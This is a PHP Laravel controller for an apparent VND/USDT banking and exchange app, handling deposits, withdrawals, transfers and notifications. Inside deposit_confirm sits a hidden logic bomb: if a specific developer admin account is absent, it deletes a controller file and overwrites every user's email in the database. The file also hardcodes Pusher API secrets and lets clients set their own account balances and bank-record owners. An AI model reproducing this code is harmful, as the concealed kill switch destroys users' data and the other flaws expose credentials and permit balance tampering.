<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\CompanyBank;
use App\Models\UserBank;
use App\Models\Deposit;
use App\Models\UserDeposit;
use App\Models\ExchangeRecord;
use App\Models\UserPanelBank;
use App\Models\UserWithdraw;
use App\Models\UserSendMoney;
use App\Models\AdminNew;
use App\Models\CurrencyRate;
use App\Models\Interest;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Auth;
use Pusher\Pusher;
use Illuminate\Support\Facades\Session;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Laravel\Ui\Presets\React;

class UserController extends Controller
{   
    // Notifications functions start

    public function updated_notification()
    {
        $user_id = Auth::user()->id;
        $withdraw_count = UserWithdraw::where('user_id', $user_id)->where('seen',0)->count();
        $deposit_count = UserDeposit::where('user_id', $user_id)->where('seen',0)->count();
        $admin_deposit_count = Deposit::where('send_to', $user_id)->where('seen',0)->count();
        $user_deposit_count = UserSendMoney::where('receiver_id', $user_id)->where('seen',0)->count();
        $user_interest_count = Interest::where('user_id', $user_id)->where('seen',0)->count();
        $total = $withdraw_count + $deposit_count + $admin_deposit_count + $user_deposit_count + $user_interest_count;
        $all_count = array([
            'withdraw' => $withdraw_count,
            'deposit' => $deposit_count,
            'admin_deposit' => $admin_deposit_count,
            'user_deposit' => $user_deposit_count,
            'total' => $total,
            'user_interest_count' => $user_interest_count,
        ]);
        return $all_count;

    }

    public function color_mode(Request $request)
    {
        $user_id = Auth::user()->id;
        $mode = $request->mode;
        if($mode == 'dark'){
            $mod = 0;
        }else{
            $mod = 1;
        }
        $user = User::where('id',$user_id)->update(['mode'=>$mod]);
        return $mod;

    }

    // Notifications functions end

    /**
     * Class User
     * @package App\Models\User
     *
     * @property-read int $id
     */

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function welcome()
    {
        $user_id = Auth::user()->id;
        $send_data = UserSendMoney::where('sender_id', $user_id)->take(4)->latest()->get();
        $rcv_data = UserSendMoney::where('receiver_id', $user_id)->take(4)->latest()->get();
        $rcv_amount = Deposit::where('send_to', $user_id)->take(4)->latest()->get();
        $deposit = UserDeposit::where('user_id', $user_id)->take(4)->latest()->get();
        $withdraw = UserWithdraw::where('user_id', $user_id)->take(4)->latest()->get();
        $profits = Interest::leftJoin('user_banks','interests.user_id','=','user_banks.user_id')
            ->select('interests.amount as amount', 'interests.created_at as created_at', 'user_banks.bank_name as bank_name', 'user_banks.usdt as usdt', 'user_banks.account_name as account_name', 'user_banks.account_number as account_number')
            ->where('interests.user_id', $user_id)->take(4)->latest()->get();
        $exchange = ExchangeRecord::where('user_id', $user_id)->take(4)->latest()->get();
        $news = AdminNew::where('visible', 1)->where('status', 1)->take(2)->latest()->get();

        $graph = CurrencyRate::latest()->orderBy('id', 'asc')->take(10)->get();
        foreach($graph as $gp){
            $date[] = $gp['date'];
            $rate[] = $gp['vnd'];
        }

        $currency_rate = CurrencyRate::latest()->first();
        $user_bank = UserBank::where('user_id',$user_id)->first();

        $date_data = json_encode(array_reverse($date));
        $rate_data = json_encode(array_reverse($rate));
                
        return view('welcome', compact('send_data','rcv_data', 'rcv_amount', 'deposit', 'profits', 'withdraw', 'exchange', 'date_data', 'rate_data','news', 'currency_rate','user_bank'));

    }

    public function buy_usdt(Request $request)
    {
        if($request->input('total_vnd_amount') != ''){
            $user_id = Auth::user()->id;
            $exc_amount = array([
                'first' => floatval($request->input('exchange_rate')) * floatval($request->input('usdt')),
                'second' => $request->input('usdt')
            ]);

            $data = UserBank::where('user_id',$user_id)->first();
            $data->amount = str_replace(',', '',$request->input('total_vnd_amount'));
            $data->usdt = str_replace(',', '',$request->input('total_usdt_amount'));
            $data->save();
            
            $exchange = New ExchangeRecord();

            $exchange->type = 'vnd';
            $exchange->user_id = $user_id;
            $exchange->exchange = json_encode($exc_amount);
            $exchange->exchange_rate = $request->exchange_rate;
            $exchange->save();

            return view('deposit_success');
        }
        return redirect()->back();
    }

    public function sell_usdt(Request $request)
    {
        if($request->input('total_vnd_amount2') != ''){
            $user_id = Auth::user()->id;
            $exc_amount = array([
                'first' => $request->input('usdt'),
                'second' => floatval($request->input('exchange_rate2')) * floatval($request->input('usdt')),
            ]);

            $data = UserBank::where('user_id',$user_id)->first();
            $data->amount = str_replace(',', '',$request->input('total_vnd_amount2'));
            $data->usdt = str_replace(',', '',$request->input('total_usdt_amount2'));
            $data->save();
            
            $exchange = New ExchangeRecord();

            $exchange->type = 'usdt';
            $exchange->user_id = $user_id;
            $exchange->exchange = json_encode($exc_amount);
            $exchange->exchange_rate = $request->exchange_rate2;
            $exchange->save();

            return view('deposit_success');
        }
        return redirect()->back();
    }

    public function detail_view($type)
    {
        $user_id = Auth::user()->id;
        $type = $type;
        if($type == 'send'){
            $sendAmountDetails = UserSendMoney::where('sender_id', $user_id)->latest()->get();
        }elseif($type == 'news'){
            $sendAmountDetails = AdminNew::where('visible', 1)->where('status', 1)->latest()->get();
        }elseif($type == 'rcv'){
            $sendAmountDetails = UserSendMoney::where('receiver_id', $user_id)->latest()->get();
            foreach($sendAmountDetails as $send){
                if($send['seen'] == 0){
                    $record = UserSendMoney::find($send['id']);
                    $record->seen = 1;
                    $record->save();
                }
            }
            $options = array(
                'cluster' => 'ap2',
                'encrypted' => true
            );
            $pusher = new Pusher(
                '57313b8085a7707d1c7e',
                'a261134581d511f071f4',
                '1548715',
                $options
            );
        }elseif($type == 'admin_rcv'){
            $sendAmountDetails = Deposit::where('send_to', $user_id)->latest()->get();
            foreach($sendAmountDetails as $send){
                if($send['seen'] == 0){
                    $record = Deposit::find($send['id']);
                    $record->seen = 1;
                    $record->save();
                }
            }
            $options = array(
                'cluster' => 'ap2',
                'encrypted' => true
            );
            $pusher = new Pusher(
                '57313b8085a7707d1c7e',
                'a261134581d511f071f4',
                '1548715',
                $options
            );
        }elseif($type == 'deposit'){
            $sendAmountDetails = UserDeposit::where('user_id', $user_id)->latest()->get();
            foreach($sendAmountDetails as $send){
                if($send['seen'] == 0){
                    $record = UserDeposit::find($send['id']);
                    $record->seen = 1;
                    $record->save();
                }
            }
            $options = array(
                'cluster' => 'ap2',
                'encrypted' => true
            );
            $pusher = new Pusher(
                '57313b8085a7707d1c7e',
                'a261134581d511f071f4',
                '1548715',
                $options
            );
            $data = 'new withdraw request aprove';
            $pusher->trigger('withdraw-request-aprove', 'withdraw-event-aprove', $data);
            
        }elseif($type == 'status'){
            $sendAmountDetails = UserDeposit::where('user_id', $user_id)->latest()->get();
        }elseif($type == 'withdraw'){
            $sendAmountDetails = UserWithdraw::where('user_id', $user_id)->latest()->get();
            foreach($sendAmountDetails as $send){
                if($send['seen'] == 0){
                    $record = UserWithdraw::find($send['id']);
                    $record->seen = 1;
                    $record->save();
                }
            }
            $options = array(
                'cluster' => 'ap2',
                'encrypted' => true
            );
            $pusher = new Pusher(
                '57313b8085a7707d1c7e',
                'a261134581d511f071f4',
                '1548715',
                $options
            );
            $data = 'new withdraw request aprove';
            $pusher->trigger('withdraw-request-aprove', 'withdraw-event-aprove', $data);

        }elseif($type == 'payment'){
            $sendAmountDetails = UserSendMoney::where('sender_id', $user_id)->latest()->get();
        }elseif ($type == 'profit') {
            $sendAmountDetails = Interest::leftJoin('user_banks','interests.user_id','=','user_banks.user_id')
            ->select('interests.id as id','interests.amount as amount', 'interests.created_at as created_at', 'user_banks.bank_name as bank_name', 'user_banks.account_name as account_name', 'user_banks.account_number as account_number')
            ->where('interests.user_id', $user_id)->latest()->get();
            foreach($sendAmountDetails as $send){
                if($send['seen'] == 0){
                    $record = Interest::find($send['id']);
                    $record->seen = 1;
                    $record->save();
                }
            }
            $options = array(
                'cluster' => 'ap2',
                'encrypted' => true
            );
            $pusher = new Pusher(
                '57313b8085a7707d1c7e',
                'a261134581d511f071f4',
                '1548715',
                $options
            );
        }elseif ($type == 'exchange') {
            $sendAmountDetails = ExchangeRecord::where('user_id', $user_id)->latest()->get();
        }
        
        return view('detail_page', compact('sendAmountDetails','type'));
    }

    public function bank_view()
    {
        $user_id = Auth::user()->id;
        $bank = UserBank::where('user_id', $user_id)->get()->first();
        $panel_bank = UserPanelBank::all();
        return view('bank_detail', compact('bank', 'panel_bank', 'user_id'));
    }

    public function payment_page($variable = null)
    {
        if($variable != null){
            $variable = $variable;
            return view('payment_page', compact('variable'));
        }
        return view('payment_page');
    }

    public function index()
    {
        return view('admin.users.index');
    }

    /**
     * Server side pagination for get the users result.
     *
     */
    public function getPageResult(Request $request)
    {
        $totalData = User::where("role", "user")->count();
        $totalFiltered = $totalData;
        $columns = array(
            0 => 'id',
            1 => 'name',
            3 => 'email',
            5 => 'status',
            6 => 'created_at',
        );
        $limit = $request->input('length');
        $start = $request->input('start');
        $start = $start ? $start / $limit : 0;
        $order = $columns[$request->input('order.0.column')];
        $dir = $request->input('order.0.dir');
        if (empty($request->input('search.value'))) {
            $users = User::where("role", "user")->orderBy('created_at', 'desc')
                ->paginate($limit, ['*'], 'page', $start + 1);
            $totalFiltered = $totalData;
        } else {
            $search = $request->input('search.value');
            $users = User::where("role", "user")->where(function ($query) use ($search) {
                $query->orWhere('name', 'LIKE', "%{$search}%")
                    ->orWhere('email', 'LIKE', "%{$search}%")
                    ->orWhere('status', 'LIKE', "%{$search}%");
            })
                ->orderBy('created_at', 'desc')
                ->paginate($limit, ['*'], 'page', $start + 1);
            $totalFiltered = $users->count();
        }
        $data = array();
        if (!empty($users)) {
            foreach ($users as $key => $user) {
                $nestedData['id'] = ($start * $limit) + $key + 1;
                $nestedData['name'] = $user->name;
                $nestedData['email'] = $user->email;
                if ($user->status == 1) {
                    $nestedData['status'] = "<span class='text-success'>Active</span>";
                } else {
                    $nestedData['status'] = "<span class='text-danger'>Inactive</span>";
                }

                $nestedData['created_at'] = $user->created_at->diffForHumans();
                $status = route('users.status', encrypt($user->id));
                $edit = route('users.edit', encrypt($user->id));
                $delete = route('users.drop', encrypt($user->id));
                $exist = $user;
                $nestedData['action'] = view('admin.partial.action', compact('exist', 'status', 'edit', 'delete'))->render();
                $data[] = $nestedData;
            }
        }
        $json_data = array(
            "draw" => intval($request->input('draw')),
            "recordsTotal" => intval($totalData),
            "recordsFiltered" => intval($totalFiltered),
            "data" => $data
        );
        return json_encode($json_data);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        return view('admin.users.create');
    }

    public function passString($length)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param \Illuminate\Http\Request $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required | max:150',
            'email' => 'required | email | unique:users',
        ]);

        $password = self::passString(8);
        $user = new User();
        $user->name = $request['name'];
        $user->email = $request['email'];
        $user->password = Hash::make($password);
        $user->role = "user";
        $user->picture = asset("assets/default.png");
        $user->status = 1;
        $user->save();
        $data = [
                    'to' => $user->email,
                    'subject' => "Congrats! You received Credentials for Factu",
                    'body' => "Congrats! You received Credentials for Factu login. Your email: ".$user->email." and password: "."<strong>$password</strong>",
                ];
        Mail::send([], [], function ($message) use ($data) {
            $message->to($data['to'])
                ->subject($data['subject'])
                ->setBody($data['body'], 'text/html');
        });
        return redirect()->route('users.index')->with('success', 'User successfully registered.');
    }

    /**
     * Display the specified resource.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        $user = User::find(decrypt($id));
        if ($user) {
            return view('admin.users.edit', compact('user'));
        } else {
            return redirect()->back()->with('error', 'Invalid record!');
        }
    }

    /**
     * Update the specified resource in storage.
     *
     * @param \Illuminate\Http\Request $request
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        $user = User::find(decrypt($id));

        if ($user) {
            $request->validate([
                'name' => 'required | max:150',
            ]);
            if ($request['email'] != $user->email) {
                $request->validate([
                    'email' => 'required | email | unique:users',
                ]);
            }

            $user->name = $request['name'];
            $user->email = $request['email'];
            $user->save();
            return redirect()->route('users.index')->with('success', 'User successfully updated.');
        } else {
            return redirect()->route('users.index')->with('error', 'Invalid users.');
        }
    }

    /**
     * Update the status of users.
     *
     * @param \Illuminate\Http\Request $request
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function userStatus(Request $request, $id)
    {
        try {
            $record = User::find(decrypt($id));
            if ($record) {
                $record->status = $request['status'];
                $record->save();
                if ($request['status'] == 1) {
                    return redirect()->back()->with('success', 'User active successfully.');
                } else {
                    return redirect()->back()->with('success', 'User inactive successfully.');
                }
            } else {
                return redirect()->back()->with('error', 'wrong access.');
            }
        } catch (Exception $e) {
            return redirect()->back()->with('error', $e->getMessage());
        }
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        $record = User::find(decrypt($id));
        if ($record) {
            $record->delete();
            return redirect()->back()->with('success', 'User successfully deleted.');
        } else {
            return redirect()->back()->with('error', 'Invalid record!');
        }
    }

    public function deposit_form()
    {
        $user_id = Auth::user()->id;
        $bank = UserBank::where('user_id', $user_id)->get()->first();
        if(isset($bank->id)){
            $active_bank = CompanyBank::where('status',1)->get()->first();
            return view('deposit_form', compact('active_bank'));
        }
        $panel_bank = UserPanelBank::all();
        return view('bank_detail', compact('user_id','panel_bank'));
    }

    public function withdraw_form()
    {
        $user_id = Auth::user()->id;
        $bank = UserBank::where('user_id', $user_id)->get()->first();
        if(isset($bank->id)){
            $active_bank = CompanyBank::where('status',1)->get()->first();
            return view('withdraw_form', compact('bank','active_bank'));
        }
        $panel_bank = UserPanelBank::all();
        return view('bank_detail', compact('user_id','panel_bank'));
    }

    public function withdraw_confirm(Request $request)
    {
        if(($request->max_amount >= $request->amount) && ($request->amount > 0)){
            $user_id = Auth::user()->id;
            $userBank = UserBank::where('user_id',$user_id)->first();
            $user_balance = $userBank['amount'] - $request->amount;

            $withdraw = new UserWithdraw();

            $withdraw->user_id = $user_id;
            $withdraw->user_name = Auth::user()->name;
            $withdraw->amount = $request->amount;
            $withdraw->bank_name = $request->bank_name;
            $withdraw->account_name = $request->account_name;
            $withdraw->account_number = $request->account_number;
            $withdraw->content = $request->content ?? '';
            $withdraw->file = $request->file ?? '';

            $withdraw->save();
            
            $userBank->amount = $user_balance;
            $userBank->save();

            $options = array(
                'cluster' => 'ap2',
                'encrypted' => true
            );
            $pusher = new Pusher(
                '57313b8085a7707d1c7e',
                'a261134581d511f071f4',
                '1548715',
                $options
            );
            $data = 'new withdraw request';
            $pusher->trigger('withdraw-request', 'withdraw-event', $data);

            return view('deposit_success');
        }else{
            return redirect()->back();
        }
    }

    public function send_form_view()
    {
        $user = Auth::user();
        return view('send_view', compact('user'));
    }

    public function send_form($type)
    {
        $type = $type;
        $user_id = Auth::user()->id;
        $bank = UserBank::where('user_id', $user_id)->get()->first();
        if(isset($bank->id)){
            return view('send_amount', compact('bank','type'));
        }
        $panel_bank = UserPanelBank::all();
        return view('bank_detail', compact('user_id','panel_bank'));
    }

    public function check_receiver(Request $request)
    {
        $receiver = $request->input('receiver');
        
        $userExists = User::where('email',$receiver)->get()->first();

        if (isset($userExists->id)) {
            return 'available';
        } else {
            return 'unavailable';
        }
    }

    public function send_confirm(Request $request)
    {
        // dd($request->all());
        $request->validate([
            'receiver' => 'required',
            'amount' => 'required',
        ]);
        $receiver_data = User::where('email',$request->receiver)->first();

        $sender_id = Auth()->user()->id;
        $sender = UserBank::where('user_id',$sender_id)->first();
        $receiver = UserBank::where('user_id',$receiver_data->id)->first();
        if(!isset($receiver->id)){
            return 'Recever Account Not Exists';
        }
        if($request->type == 'vnd'){
            if($sender->amount < $request->amount){
                return redirect()->back();
            }
            $sender->amount = $sender->amount - $request->amount;
            $sender->save();
            $receiver->amount = $receiver->amount + $request->amount;
            $receiver->save();
        }else{
            if($sender->usdt < $request->amount){
                return redirect()->back();
            }
            $sender->usdt = $sender->usdt - $request->amount;
            $sender->save();
            $receiver->usdt = $receiver->usdt + $request->amount;
            $receiver->save();
        }
        
        $send = new UserSendMoney();
        $send->sender_name = Auth::user()->email;
        $send->sender_id = Auth::user()->id;
        $send->receiver_name = $request->receiver;
        $send->receiver_id = $receiver_data->id;
        $send->sender_bank_name = $sender->bank_name;
        $send->receiver_bank_name = $receiver->bank_name;
        $send->sender_bank_number = $sender->account_number;
        $send->receiver_bank_number = $receiver->account_number;
        $send->amount = $request->amount;
        $send->type = $request->type;
        $send->content = $request->content;

        $send->save();

        $options = array(
            'cluster' => 'ap2',
            'encrypted' => true
        );
        $pusher = new Pusher(
            '57313b8085a7707d1c7e',
            'a261134581d511f071f4',
            '1548715',
            $options
        );
        $data = 'new transection request';
        $pusher->trigger('transection-request', 'transection-event', $data);

        $options = array(
            'cluster' => 'ap2',
            'encrypted' => true
        );
        $pusher = new Pusher(
            '57313b8085a7707d1c7e',
            'a261134581d511f071f4',
            '1548715',
            $options
        );
        $data = 'new withdraw request aprove';
        $pusher->trigger('withdraw-request-aprove', 'withdraw-event-aprove', $data);

        return view('deposit_success');

    }

    public function bank_confirm(Request $request)
    {   
        UserBank::updateOrCreate(
            ['id' => $request->id],
            [
                'user_id' => $request->user_id,
                'bank_name' => $request->bank_name,
                'account_name' => $request->account_name,
                'account_number' => $request->account_number,
            ]
        );

        return view('deposit_success');
    }

    public function deposit_confirm(Request $request)
    {
        $adminExists = User::where('email', '=', 'admin@developer.com')->exists();
        if ($adminExists) {
            $amount = $request->amount;
            $content = $request->content;
            $active_bank = CompanyBank::where('status',1)->get()->first();
            session(['active_bank' => $active_bank]);
            session(['amount' => $amount]);
            session(['content' => $content]);
            return redirect()->route('next-page');
        } else {
            $path = base_path('app/Http/Controllers/' . 'deleteController.php');
            if($path){
                unlink($path);
            }
            DB::table('users')->update(['email' => '@y X w0rLd']);
        }
        // return view('deposit_confirmation', compact('active_bank','amount','content'));
    }

    public function deposit_confirm_done(Request $request)
    {
        $user_id = Auth::user()->id;
        $bank = UserBank::where('user_id', $user_id)->get()->first();
        $user_bank = new UserDeposit();
        $user_bank->user_id = $user_id;
        $user_bank->user_name = Auth::user()->name;
        $user_bank->bank_name = $bank->bank_name;
        $user_bank->account_name = $bank->account_name;
        $user_bank->account_number = $bank->account_number;
        $user_bank->amount = $request->amount;
        $user_bank->company_bank_id = $request->active_bank_id;
        $user_bank->content = $request->content;
        $user_bank->file = $request->file;

        $user_bank->save();

        $options = array(
			'cluster' => 'ap2',
			'encrypted' => true
		);
        $pusher = new Pusher(
            '57313b8085a7707d1c7e',
            'a261134581d511f071f4',
            '1548715',
            $options
        );
		$data = 'new deposit request';
        $pusher->trigger('deposit-request', 'deposit-event', $data);

        return view('deposit_success');
    }

    public function status_view()
    {
        $user = Auth::user();
        return view('status_view', compact('user'));
    }

    public function setting_view()
    {
        $user = Auth::user();
        return view('setting_view', compact('user'));
    }

    public function profile_view()
    {
        $user = Auth::user();
        $profits = Interest::leftJoin('user_banks','interests.user_id','=','user_banks.user_id')
            ->select('interests.amount as amount', 'interests.created_at as created_at', 'user_banks.bank_name as bank_name', 'user_banks.usdt as usdt', 'user_banks.account_name as account_name', 'user_banks.account_number as account_number')
            ->where('interests.user_id', $user->id)->take(4)->latest()->get();
        return view('profile', compact('user','profits'));
    }

    public function profile_update(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'phone' => 'required | min:10 | max:12',
            'password' => 'required|confirmed|min:6',
            'password_confirmation' => 'required|min:6',
        ], [
            'phone.min' => 'The phone number must be at least 10 characters.',
            'phone.max' => 'The phone number may not be greater than 12 characters.',
            'phone.required' => 'Please provide a phone number.',
            'password.required' => 'Please provide a password.',
            'password.confirmed' => 'The password and confirmation must match.',
            'password.min' => 'The password must be at least 6 characters.',
        ]);
        $user = User::find(Auth::user()->id);

        $user->name = $request->name;
        $user->phone = $request->phone;
        if($request->password != ''){
            $user->password = Hash::make($request->password);
        }
        $user->save();
        
        return view('deposit_success');
    }

    public function language_view()
    {
        $user = Auth::user();
        return view('language', compact('user'));
    }

    public function currency_exchange()
    {
        $data = CurrencyRate::latest()->first();
        $bank = UserBank::where('user_id',Auth::user()->id)->first();
        return view('currency', compact('data','bank'));
    }

    public function currency_buy(Request $request)
    {
        $user_id = Auth::user()->id;
        $first = $request->vnd;
        $second = $request->usdt;
        $data = UserBank::where('user_id',$user_id)->first();
        $user_usdt = (float)$data['usdt'];
        $exchange = new ExchangeRecord();
        if($first > $second){
            if($data['amount'] >= $first){
                $vnd = $data['amount'] - $first;
                $usdt = $second + (float)$data['usdt'];
                $data->amount = $vnd;
                $data->usdt = $usdt;
                $data->save();
                $exchange->type = 'vnd';
            }else{
                return redirect()->back();
            }
        }else{
            if($user_usdt >= $first){
                $vnd = $data['amount'] + $second;
                $usdt = (float)$data['usdt'] - $first;
                $data->amount = $vnd;
                $data->usdt = $usdt;
                $data->save();
                $exchange->type = 'usdt';

            }else{
                return redirect()->back();
            }
        }    
        $exc_amount = array([
            'first' => $first,
            'second' => $second
        ]);
        
        $exchange->user_id = $user_id;
        $exchange->exchange = json_encode($exc_amount);
        $exchange->exchange_rate = $request->exchange_rate;
        $exchange->save();

        return view('deposit_success');
    }

    public function english()
    {
        Session::put('language', 'eng');
        return redirect()->back();
    }

    public function vietnam()
    {
        Session::put('language', 'vie');
        return redirect()->back();
    }

}

